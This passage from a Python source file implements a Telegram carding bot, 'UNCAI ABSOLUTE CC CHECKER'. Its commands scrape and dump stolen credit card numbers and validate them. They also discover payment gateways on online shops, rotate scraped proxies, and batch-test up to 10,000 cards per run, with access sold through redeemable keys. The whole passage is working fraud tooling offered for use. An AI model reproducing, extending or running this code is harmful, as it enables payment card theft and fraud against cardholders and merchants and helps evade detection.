                        if keyword in text.lower():
                            found.append(keyword)
                    result["details"]["payment_keywords"] = found
                    
                    # Deduplicate
                    seen = set()
                    unique = []
                    for g in result["detected_gateways"]:
                        if g["name"] not in seen:
                            seen.add(g["name"])
                            unique.append(g)
                    result["detected_gateways"] = unique
                    
                    # Calculate confidence
                    result["confidence"] = len(unique) * 25
                    if result["confidence"] > 100:
                        result["confidence"] = 100
                    
        except Exception as e:
            result["error"] = str(e)
        
        return result

# -----------------------------------------------------------------------------
# PROXY SCRAPER (Enhanced)
# -----------------------------------------------------------------------------
class ProxyScraper:
    def __init__(self):
        self.proxies: List[Dict] = []
        self.lock = threading.Lock()
        self.sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://api.openproxylist.xyz/http.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
            "https://proxy-ssl.com/proxy/list.txt",
            "https://proxy-list.org/list.txt",
            "https://free-proxy-list.net/proxy.txt",
            "https://sslproxies.org/proxy.txt",
            "https://socks-proxy.net/proxy.txt"
        ]

    async def scrape(self) -> List[Dict]:
        async with aiohttp.ClientSession() as session:
            tasks = [self._fetch_source(session, url) for url in self.sources]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            proxies = []
            for result in results:
                if isinstance(result, list):
                    proxies.extend(result)
            
            seen = set()
            unique = []
            for p in proxies:
                key = f"{p['ip']}:{p['port']}"
                if key not in seen:
                    seen.add(key)
                    unique.append(p)
            
            with self.lock:
                self.proxies = unique
            
            logger.info(f"Scraped {len(unique)} proxies")
            return unique

    async def _fetch_source(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        try:
            async with session.get(url, timeout=10) as resp:
                text = await resp.text()
                proxies = []
                for line in text.strip().split('\n'):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = re.split(r'[:@]', line)
                    if len(parts) >= 2:
                        ip = parts[0].strip()
                        port = parts[1].strip()
                        if port.isdigit():
                            proxies.append({
                                "ip": ip,
                                "port": int(port),
                                "protocol": "http",
                                "country": "unknown",
                                "speed": 0.0
                            })
                return proxies
        except Exception as e:
            logger.debug(f"Failed to fetch proxies from {url}: {e}")
            return []

    async def test_proxy(self, proxy: Dict) -> bool:
        test_url = "https://httpbin.org/ip"
        proxy_str = f"{proxy['protocol']}://{proxy['ip']}:{proxy['port']}"
        try:
            async with aiohttp.ClientSession() as session:
                start = time.time()
                async with session.get(
                    test_url,
                    proxy=proxy_str,
                    timeout=5
                ) as resp:
                    if resp.status == 200:
                        proxy["speed"] = time.time() - start
                        return True
            return False
        except:
            return False

    async def get_alive_proxies(self, limit: int = 100) -> List[Dict]:
        with self.lock:
            if len(self.proxies) < 10:
                await self.scrape()
        
        with self.lock:
            to_test = self.proxies[:limit*2]
        
        tasks = [self.test_proxy(p) for p in to_test]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        alive = []
        for i, result in enumerate(results):
            if result is True:
                alive.append(to_test[i])
                if len(alive) >= limit:
                    break
        
        with self.lock:
            dead_ips = {p['ip'] for p in to_test if p not in alive}
            self.proxies = [p for p in self.proxies if p['ip'] not in dead_ips]
        
        return alive

# -----------------------------------------------------------------------------
# TELEGRAM BOT (Complete with all features)
# -----------------------------------------------------------------------------
class CCBot:
    def __init__(self, token: str):
        self.token = token
        self.db = Database()
        # ===== FORCE OWNER AS ADMIN ON STARTUP =====
        async def force_admin():
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (OWNER_ID,))
                await db.commit()
                logger.info(f"✅ Owner {OWNER_ID} forced as admin")
        
        try:
            asyncio.create_task(force_admin())
        except:
            pass
        # ===== END FORCE ADMIN =====
        self.checker = CCChecker()
        self.proxy_scraper = ProxyScraper()
        self.cc_scraper = CCScraper()
        self.site_scraper = SiteScraper()
        self.gateway_checker = GatewayChecker()
        self.user_sessions: Dict[int, Dict] = {}
        self.batch_tasks: Dict[int, asyncio.Task] = {}
        
        self.application = Application.builder().token(token).build()
        self._register_handlers()

    def _register_handlers(self):
        app = self.application
        
        # Basic commands
        app.add_handler(CommandHandler("start", self.start_command))
        app.add_handler(CommandHandler("help", self.help_command))
        app.add_handler(CommandHandler("owner", self.owner_command))
        
        # CC commands
        app.add_handler(CommandHandler("check", self.check_command))
        app.add_handler(CommandHandler("checkfile", self.check_file_command))
        app.add_handler(CommandHandler("status", self.status_command))
        app.add_handler(CommandHandler("validatecc", self.validate_cc_command))
        
        # Key management
        app.add_handler(CommandHandler("genkey", self.genkey_command))
        app.add_handler(CommandHandler("redeem", self.redeem_command))
        app.add_handler(CommandHandler("keys", self.keys_command))
        
        # Proxy commands
        app.add_handler(CommandHandler("scrapeproxy", self.scrape_proxy_command))
        app.add_handler(CommandHandler("proxylist", self.proxy_list_command))
        app.add_handler(CommandHandler("testproxy", self.test_proxy_command))
        
        # CC Scraper commands
        app.add_handler(CommandHandler("scrapecc", self.scrape_cc_command))
        app.add_handler(CommandHandler("cleancc", self.clean_cc_command))
        app.add_handler(CommandHandler("ccdump", self.cc_dump_command))
        
        # Site Scraper commands
        app.add_handler(CommandHandler("sitesearch", self.site_search_command))
        app.add_handler(CommandHandler("addsite", self.add_site_command))
        app.add_handler(CommandHandler("sites", self.sites_command))
        app.add_handler(CommandHandler("scansite", self.scan_site_command))
        
        # Gateway Checker commands
        app.add_handler(CommandHandler("gateways", self.gateways_command))
        app.add_handler(CommandHandler("checkgateway", self.check_gateway_command))
        app.add_handler(CommandHandler("discover", self.discover_gateway_command))
        
        # Stats
        app.add_handler(CommandHandler("stats", self.stats_command))
        app.add_handler(CommandHandler("profile", self.profile_command))
        app.add_handler(CommandHandler("leaderboard", self.leaderboard_command))
        
        # Admin commands
        app.add_handler(CommandHandler("admin", self.admin_command))
        app.add_handler(CommandHandler("ban", self.ban_command))
        app.add_handler(CommandHandler("unban", self.unban_command))
        app.add_handler(CommandHandler("broadcast", self.broadcast_command))
        app.add_handler(CommandHandler("setadmin", self.set_admin_command))
        app.add_handler(CommandHandler("backup", self.backup_command))
        
        # Callbacks
        app.add_handler(CallbackQueryHandler(self.gateway_callback, pattern="gateway_"))
        app.add_handler(CallbackQueryHandler(self.check_callback, pattern="check_"))
        app.add_handler(CallbackQueryHandler(self.menu_callback, pattern="menu_"))
        
        # Message handlers
        app.add_handler(MessageHandler(filters.Document.ALL, self.file_handler))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.text_handler))

    # -------------------------------------------------------------------------
    # CC SCRAPER COMMANDS
    # -------------------------------------------------------------------------
    
    async def scrape_cc_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        await update.message.reply_text("🔄 Scraping CCs from all sources... This may take a moment")
        
        try:
            ccs = await self.cc_scraper.scrape()
            
            await update.message.reply_text(
                f"✅ *CC Scrape Complete!*\n\n"
                f"📊 Total CCs: {len(ccs)}\n"
                f"💾 Saved to: `{CC_FILE}`\n"
                f"🔄 Cached in database\n\n"
                f"Use `/ccdump` to view scraped CCs\n"
                f"Use `/cleancc` to clean CCs",
                parse_mode='Markdown'
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def clean_cc_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if args:
            filename = args[0]
            try:
                with open(filename, 'r') as f:
                    raw_ccs = f.readlines()
            except:
                await update.message.reply_text(f"❌ File not found: {filename}")
                return
        else:
            # Use scraped CCs
            raw_ccs = await self.cc_scraper.get_cached_ccs(limit=10000)
        
        await update.message.reply_text(f"🔄 Cleaning {len(raw_ccs)} CCs...")
        
        cleaned = self.cc_scraper.clean_ccs(raw_ccs)
        
        # Save cleaned
        clean_file = f"/tmp/clean_cc_{int(time.time())}.txt"
        with open(clean_file, 'w') as f:
            for cc in cleaned:
                f.write(f"{cc}\n")
        
        await update.message.reply_text(
            f"✅ *CC Cleaning Complete!*\n\n"
            f"📊 Original: {len(raw_ccs)}\n"
            f"🧹 Cleaned: {len(cleaned)}\n"
            f"🗑️ Removed: {len(raw_ccs) - len(cleaned)}\n"
            f"💾 Saved to: `{clean_file}`",
            parse_mode='Markdown'
        )

    async def cc_dump_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        limit = int(args[0]) if args and args[0].isdigit() else 100
        
        if limit > 1000:
            await update.message.reply_text("⚠️ Limit too high. Max 1000")
            limit = 1000
        
        ccs = await self.cc_scraper.get_cached_ccs(limit=limit)
        
        if not ccs:
            await update.message.reply_text("ℹ️ No CCs in cache. Use /scrapecc first")
            return
        
        # Create file
        filename = f"/tmp/cc_dump_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for cc in ccs:
                f.write(f"{cc}\n")
        
        await update.message.reply_text(
            f"📋 *CC Dump*\n\n"
            f"📊 Showing {len(ccs)} CCs\n"
            f"💾 File: `{filename}`\n\n"
            f"First 10 CCs:\n"
            f"```\n{chr(10).join(ccs[:10])}\n```",
            parse_mode='Markdown'
        )

    async def validate_cc_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ *Usage:* `/validatecc CC`\n"
                "Example: `/validatecc 4111111111111111|12|25|123`",
                parse_mode='Markdown'
            )
            return
        
        cc = ' '.join(args)
        
        # Validate format
        parts = cc.split('|')
        if len(parts) < 4:
            await update.message.reply_text("❌ Invalid format. Use: CC|MM|YY|CVV")
            return
        
        number = parts[0]
        month = parts[1]
        year = parts[2]
        cvv = parts[3]
        
        # Check Luhn
        is_valid = self.cc_scraper._validate_luhn(number)
        
        # Additional checks
        is_valid_expiry = True
        try:
            expiry_date = datetime(int(f"20{year}"), int(month), 1)
            if expiry_date < datetime.now():
                is_valid_expiry = False
        except:
            is_valid_expiry = False
        
        msg = f"""
📋 *CC Validation Results*

CC: `{number}`
Month: {month}
Year: {year}
CVV: {cvv}

✅ Luhn Check: {'✅ Passed' if is_valid else '❌ Failed'}
✅ Expiry Check: {'✅ Valid' if is_valid_expiry else '❌ Expired'}

📊 Overall Status: {'✅ VALID' if is_valid and is_valid_expiry else '❌ INVALID'}
        """
        
        await update.message.reply_text(msg, parse_mode='Markdown')

    # -------------------------------------------------------------------------
    # SITE SCRAPER COMMANDS
    # -------------------------------------------------------------------------
    
    async def site_search_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        query = ' '.join(context.args) if context.args else None
        
        await update.message.reply_text("🔍 Searching for sites... This may take a moment")
        
        try:
            sites = await self.site_scraper.search(query)
            
            if not sites:
                await update.message.reply_text("ℹ️ No sites found")
                return
            
            msg = "🔍 *Found Sites*\n\n"
            for site in sites[:20]:
                gateway = site.get('gateway', 'unknown')
                msg += f"• {site['domain']} - `{gateway}`\n"
            
            if len(sites) > 20:
                msg += f"\n... and {len(sites) - 20} more"
            
            msg += f"\n\n💾 Saved {len(sites)} sites to database"
            
            await update.message.reply_text(msg, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def add_site_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text(
                "❌ *Usage:* `/addsite domain gateway`\n"
                "Example: `/addsite example.shopify.com shopify`",
                parse_mode='Markdown'
            )
            return
        
        domain = args[0]
        gateway = args[1]
        
        if gateway not in GATEWAYS:
            await update.message.reply_text(
                f"❌ Gateway must be one of: {', '.join(GATEWAYS.keys())}"
            )
            return
        
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "INSERT OR IGNORE INTO sites (domain, gateway_type, added_by, added_at) VALUES (?, ?, ?, ?)",
                    (domain, gateway, user_id, datetime.now().isoformat())
                )
                await db.commit()
            
            await update.message.reply_text(f"✅ Site added: {domain} ({gateway})")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def sites_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                async with db.execute(
                    "SELECT domain, gateway_type, is_active, last_checked, status FROM sites ORDER BY id DESC LIMIT 50"
                ) as cursor:
                    rows = await cursor.fetchall()
                    
                    if not rows:
                        await update.message.reply_text("ℹ️ No sites in database")
                        return
                    
                    msg = "🌐 *Sites Database*\n\n"
                    for domain, gateway, active, last_checked, status in rows:
                        status_icon = "✅" if active and status != "down" else "❌"
                        msg += f"{status_icon} {domain} - `{gateway}`"
                        if status:
                            msg += f" - {status}"
                        msg += "\n"
                    
                    await update.message.reply_text(msg, parse_mode='Markdown')
                    
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def scan_site_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ *Usage:* `/scansite domain.com`\n"
                "Example: `/scansite example.shopify.com`",
                parse_mode='Markdown'
            )
            return
        
        domain = args[0]
        
        await update.message.reply_text(f"🔍 Scanning {domain}...")
        
        try:
            result = await self.site_scraper.scan_site(domain)
            
            msg = f"""
📊 *Site Scan Results: {domain}*

🌐 Status: {result['status']}
🏷️ Gateway: {result['gateway'] or 'Not detected'}
📊 Score: {result['score']}/100

🖥️ Technologies: {', '.join(result['technologies']) if result['technologies'] else 'None'}
📄 Pages Found: {len(result['pages'])}
🌐 IPs: {', '.join(result['ips'][:3]) if result['ips'] else 'N/A'}

🔗 WHOIS:
• Registrar: {result['whois'].get('registrar', 'N/A')}
• Created: {result['whois'].get('creation_date', 'N/A')}
• Expires: {result['whois'].get('expiration_date', 'N/A')}
            """
            
            await update.message.reply_text(msg, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    # -------------------------------------------------------------------------
    # GATEWAY CHECKER COMMANDS
    # -------------------------------------------------------------------------
    
    async def gateways_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        msg = "🛒 *Available Gateways*\n\n"
        
        for name, gateway in GATEWAYS.items():
            msg += f"• **{name.upper()}**\n"
            msg += f"  URL: {gateway['url'][:50]}...\n"
            msg += f"  Method: {gateway['method']}\n"
            msg += f"  Fields: {', '.join(gateway['fields'][:3])}\n\n"
        
        msg += "\nUse `/checkgateway gateway_name` to test a gateway"
        
        await update.message.reply_text(msg, parse_mode='Markdown')

    async def check_gateway_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ *Usage:* `/checkgateway gateway_name`\n"
                f"Available: {', '.join(GATEWAYS.keys())}",
                parse_mode='Markdown'
            )
            return
        
        gateway_name = args[0]
        
        if gateway_name not in GATEWAYS:
            await update.message.reply_text(f"❌ Gateway not found. Available: {', '.join(GATEWAYS.keys())}")
            return
        
        await update.message.reply_text(f"🔍 Checking {gateway_name} gateway...")
        
        try:
            result = await self.gateway_checker.check_gateway_health(gateway_name)
            
            status_icon = "✅" if result['status'] == 'online' else "❌"
            msg = f"""
📊 *Gateway Check: {gateway_name.upper()}*

Status: {status_icon} {result['status']}
Response Time: {result.get('response_time', 0):.2f}s
Test Result: {result.get('test_result', 'N/A')}
            """
            
            if result.get('error'):
                msg += f"\n❌ Error: {result['error']}"
            
            await update.message.reply_text(msg, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def discover_gateway_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ *Usage:* `/discover https://example.com`",
                parse_mode='Markdown'
            )
            return
        
        url = args[0]
        
        await update.message.reply_text(f"🔍 Discovering gateway at {url}...")
        
        try:
            result = await self.gateway_checker.discover_gateway(url)
            
            if result.get('error'):
                await update.message.reply_text(f"❌ Error: {result['error']}")
                return
            
            msg = f"""
📊 *Gateway Discovery: {url}*

🔍 Detected Gateways: {', '.join([g['name'] for g in result.get('detected_gateways', [])]) if result.get('detected_gateways') else 'None'}
📊 Confidence: {result.get('confidence', 0)}%

📋 Payment Keywords: {', '.join(result.get('details', {}).get('payment_keywords', []))}
            """
            
            await update.message.reply_text(msg, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    # -------------------------------------------------------------------------
    # PROXY COMMANDS
    # -------------------------------------------------------------------------
    
    async def scrape_proxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        await update.message.reply_text("🔄 Scraping proxies from all sources...")
        
        try:
            proxies = await self.proxy_scraper.scrape()
            
            # Save to database
            async with aiosqlite.connect(DB_PATH) as db:
                for proxy in proxies:
                    await db.execute(
                        "INSERT OR IGNORE INTO proxies (ip, port, protocol, country) VALUES (?, ?, ?, ?)",
                        (proxy['ip'], proxy['port'], proxy['protocol'], proxy.get('country', 'unknown'))
                    )
                await db.commit()
            
            await update.message.reply_text(
                f"✅ *Proxy Scrape Complete!*\n\n"
                f"📊 Total Proxies: {len(proxies)}\n"
                f"💾 Saved to database\n\n"
                f"Use `/proxylist` to view proxies",
                parse_mode='Markdown'
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def proxy_list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        limit = 50
        
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                async with db.execute(
                    "SELECT ip, port, protocol, country, speed, is_alive FROM proxies WHERE is_alive = 1 ORDER BY speed ASC LIMIT ?",
                    (limit,)
                ) as cursor:
                    rows = await cursor.fetchall()
                    
                    if not rows:
                        await update.message.reply_text("ℹ️ No proxies in database. Use /scrapeproxy first")
                        return
                    
                    msg = "🌐 *Alive Proxies*\n\n"
                    for ip, port, protocol, country, speed, alive in rows:
                        msg += f"• {protocol}://{ip}:{port} - {country or 'unknown'} - {speed:.2f}s\n"
                    
                    await update.message.reply_text(msg, parse_mode='Markdown')
                    
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def test_proxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text(
                "❌ *Usage:* `/testproxy ip port`\n"
                "Example: `/testproxy 192.168.1.1 8080`",
                parse_mode='Markdown'
            )
            return
        
        ip = args[0]
        port = int(args[1])
        
        proxy = {
            "ip": ip,
            "port": port,
            "protocol": "http"
        }
        
        await update.message.reply_text(f"🧪 Testing proxy {ip}:{port}...")
        
        try:
            is_alive = await self.proxy_scraper.test_proxy(proxy)
            
            if is_alive:
                await update.message.reply_text(f"✅ Proxy {ip}:{port} is alive! Speed: {proxy['speed']:.2f}s")
            else:
                await update.message.reply_text(f"❌ Proxy {ip}:{port} is dead")
                
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    # -------------------------------------------------------------------------
    # MAIN BOT COMMANDS
    # -------------------------------------------------------------------------
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        await self.db.create_user(user.id, user.username, user.first_name, user.last_name)
        
        welcome = f"""
🔥 *UNCAI ABSOLUTE CC CHECKER* 🔥

*The most powerful CC checker on Telegram*

✅ *Features:*
• Lightning fast (500 threads)
• 10,000 CC limit per batch
• 12+ gateways supported
• Built-in CC scraper
• Built-in site scraper
• Gateway discovery
• Proxy scraper
• Key system
• And more!

📌 *Core Commands:*
/check - Check CCs
/checkfile - Check file with CCs
/status - Check batch status
/validatecc - Validate CC format
/scrapecc - Scrape CCs (admin)
/scrapeproxy - Scrape proxies (admin)
/sitesearch - Search for sites (admin)
/gateways - List all gateways
/discover - Discover gateway on site
/stats - Your stats
/profile - Your profile
/help - Full help

💎 *Bot by @{context.bot.username}*
        """
        
        await update.message.reply_text(welcome, parse_mode='Markdown')

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = """
📚 *UNCAI CC CHECKER - FULL HELP*

*🔹 CC CHECKING*
/check CC|MM|YY|CVV - Check single CC
/checkfile - Upload .txt file with CCs
/status - Check batch status
/validatecc - Validate CC format

*🔹 CC SCRAPER*
/scrapecc - Scrape CCs from sources (admin)
/cleancc - Clean and validate CCs
/ccdump - View scraped CCs

*🔹 SITE SCRAPER*
/sitesearch - Search for gateway sites
/addsite domain gateway - Add site manually
/sites - List all sites
/scansite domain - Scan site details

*🔹 GATEWAY CHECKER*
/gateways - List all gateways
/checkgateway name - Check gateway health
/discover url - Discover gateway on site

*🔹 PROXY SCRAPER*
/scrapeproxy - Scrape proxies (admin)
/proxylist - View alive proxies
/testproxy ip port - Test proxy

*🔹 KEY SYSTEM*
/genkey uses days - Generate key (admin)
/redeem KEY - Redeem key
/keys - Your keys

*🔹 STATS*
/stats - Your statistics
/profile - Your profile
/leaderboard - Top users

*🔹 ADMIN*
/admin - Admin panel
/ban user_id - Ban user
/unban user_id - Unban user
/broadcast - Broadcast message
/setadmin user_id - Make admin
/backup - Backup database

💡 *CC Format:* `CC|MM|YY|CVV`
        """
        
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def owner_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id != OWNER_ID:
            await update.message.reply_text("❌ Only the owner can use this command")
            return
        
        msg = f"""
👑 *OWNER PANEL*

*Bot Owner:* {update.effective_user.first_name}
*User ID:* {user_id}

*System Stats:*
• Total Users: {await self._get_user_count()}
• Total Checks: {await self._get_total_checks()}
• Valid CCs: {await self._get_valid_checks()}
• Active Batches: {len(self.batch_tasks)}

*Features:*
• CC Scraper: ✅
• Site Scraper: ✅
• Gateway Checker: ✅
• Proxy Scraper: ✅
• Key System: ✅
        """
        
        await update.message.reply_text(msg, parse_mode='Markdown')

    # -------------------------------------------------------------------------
    # CHECK COMMANDS
    # -------------------------------------------------------------------------
    
    async def check_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if user and user.get('is_banned', 0):
            await update.message.reply_text("❌ You are banned from using this bot")
            return
        
        if not await self._has_valid_key(user_id):
            await update.message.reply_text(
                "❌ You need an access key to use this bot\n"
                "Redeem a key with /redeem KEY"
            )
            return
        
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ *Usage:* `/check CC|MM|YY|CVV`\n"
                "Example: `/check 4111111111111111|12|25|123`",
                parse_mode='Markdown'
            )
            return
        
        cc_str = ' '.join(args)
        parts = cc_str.split('|')
        if len(parts) < 4:
            await update.message.reply_text(
                "❌ *Invalid format*\n"
                "Use: `CC|MM|YY|CVV`",
                parse_mode='Markdown'
            )
            return
        
        keyboard = self._get_gateway_keyboard()
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        self.user_sessions[user_id] = {
            "action": "check_cc",
            "cc": cc_str,
            "user_id": user_id
        }
        
        await update.message.reply_text(
            f"🔍 *Select gateway to check:*\n\nCC: `{cc_str}`",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

    async def check_file_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if user and user.get('is_banned', 0):
            await update.message.reply_text("❌ You are banned from using this bot")
            return
        
        if not await self._has_valid_key(user_id):
            await update.message.reply_text(
                "❌ You need an access key to use this bot\n"
                "Redeem a key with /redeem KEY"
            )
            return
        
        if user_id in self.batch_tasks and not self.batch_tasks[user_id].done():
            await update.message.reply_text(
                "⏳ You have a batch running already!\n"
                "Use /status to check progress"
            )
            return
        
        self.user_sessions[user_id] = {
            "action": "check_file",
            "user_id": user_id
        }
        
        keyboard = self._get_gateway_keyboard()
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "📁 *Upload a .txt file with CCs*\n\n"
            "Format: One CC per line\n"
            "CC format: `CC|MM|YY|CVV`\n\n"
            "Max: 10,000 CCs per batch\n\n"
            "*Select gateway:*",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if user_id in self.batch_tasks:
            task = self.batch_tasks[user_id]
            if task.done():
                try:
                    result = task.result()
                    if result:
                        msg = f"""
📊 *BATCH COMPLETED*

✅ *Results:*
• Total: {result['total']}
• Checked: {result['checked']}
• ✅ Valid: {result['valid']}
• ❌ Invalid: {result['invalid']}
• ❓ Unknown: {result['unknown']}

🔑 *Batch ID:* `{result['batch_id']}`
                        """
                        await update.message.reply_text(msg, parse_mode='Markdown')
                    else:
                        await update.message.reply_text("❌ No results from batch")
                except Exception as e:
                    await update.message.reply_text(f"❌ Batch failed: {str(e)}")
                finally:
                    del self.batch_tasks[user_id]
            else:
                await update.message.reply_text("⏳ Batch is still running... Please wait")
        else:
            await update.message.reply_text("ℹ️ No active batch found")

    # -------------------------------------------------------------------------
    # KEY COMMANDS
    # -------------------------------------------------------------------------
    
    async def genkey_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text(
                "❌ *Usage:* `/genkey uses days`\n"
                "Example: `/genkey 10 30`",
                parse_mode='Markdown'
            )
            return
        
        try:
            max_uses = int(args[0])
            days = int(args[1])
            
            if max_uses < 1 or days < 1:
                await update.message.reply_text("❌ Values must be positive")
                return
            
            key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
            expires_at = (datetime.now() + timedelta(days=days)).isoformat()
            
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "INSERT INTO keys (key, created_by, created_at, expires_at, max_uses) VALUES (?, ?, ?, ?, ?)",
                    (key, user_id, datetime.now().isoformat(), expires_at, max_uses)
                )
                await db.commit()
            
            await update.message.reply_text(
                f"✅ *Key generated successfully*\n\n"
                f"🔑 *Key:* `{key}`\n"
                f"📊 *Max Uses:* {max_uses}\n"
                f"📅 *Expires:* {expires_at}",
                parse_mode='Markdown'
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def redeem_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        args = context.args
        
        if not args:
            await update.message.reply_text(
                "❌ *Usage:* `/redeem KEY`",
                parse_mode='Markdown'
            )
            return
        
        key = args[0].strip().upper()
        
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                async with db.execute(
                    "SELECT * FROM keys WHERE key = ? AND is_active = 1",
                    (key,)
                ) as cursor:
                    row = await cursor.fetchone()
                    if not row:
                        await update.message.reply_text("❌ Invalid or inactive key")
                        return
                    
                    columns = [desc[0] for desc in cursor.description]
                    key_data = dict(zip(columns, row))
                
                expires_at = datetime.fromisoformat(key_data['expires_at'])
                if expires_at < datetime.now():
                    await update.message.reply_text("❌ Key has expired")
                    return
                
                if key_data['used_count'] >= key_data['max_uses']:
                    await update.message.reply_text("❌ Key has reached max uses")
                    return
                
                await db.execute(
                    "UPDATE keys SET used_count = used_count + 1 WHERE key = ?",
                    (key,)
                )
                
                await db.execute(
                    "UPDATE users SET balance = balance + 1 WHERE user_id = ?",
                    (user_id,)
                )
                if db.total_changes == 0:
                    await db.execute(
                        "INSERT INTO users (user_id, balance) VALUES (?, 1)",
                        (user_id,)
                    )
                
                await db.commit()
            
            await update.message.reply_text(
                f"✅ *Key redeemed successfully!*\n\n"
                f"🔑 Key: `{key}`\n"
                f"💎 Balance: +1 check",
                parse_mode='Markdown'
            )
            
        except Exception as e:
